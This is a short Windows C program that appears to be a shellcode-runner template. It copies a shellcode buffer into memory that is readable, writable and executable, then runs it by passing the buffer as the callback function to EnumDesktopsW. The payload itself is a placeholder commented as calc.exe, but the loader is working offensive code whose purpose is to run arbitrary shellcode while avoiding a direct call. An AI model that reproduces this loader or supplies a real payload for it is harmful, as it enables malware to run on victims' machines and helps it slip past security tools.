#include <windows.h>
#include <stdio.h>
#include "wingdi.h"

int main() {
    char shellcode[] = "..."; // calc.exe shellcode

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW) hAlloc, NULL);
    printf("%d", GetLastError());
    VirtualFree(hAlloc, 0, MEM_RELEASE);
}
